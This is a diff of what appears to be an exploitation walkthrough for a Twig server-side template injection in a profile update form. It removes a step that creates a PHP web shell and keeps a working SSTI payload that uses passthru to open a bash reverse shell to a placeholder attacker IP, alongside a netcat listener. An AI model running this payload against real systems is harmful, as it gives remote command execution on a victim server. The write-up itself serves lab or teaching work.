@@ -188,14 +188,7 @@ Submit the following payload in the profile update form (e.g., the name/username
 nc -nvlp 4444
 ```
 
-**Step 2** — Create a PHP web shell and serve it via a Python HTTP server:
-
-```bash
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-python3 -m http.server 8000
-```
-
-**Step 3** — Inject the following Twig SSTI payload into the profile update field:
+**Step 2** — Inject the following Twig SSTI payload into the profile update field:
 
 ```twig
 {{ ["bash -c 'exec bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'", ""] | sort('passthru') }}
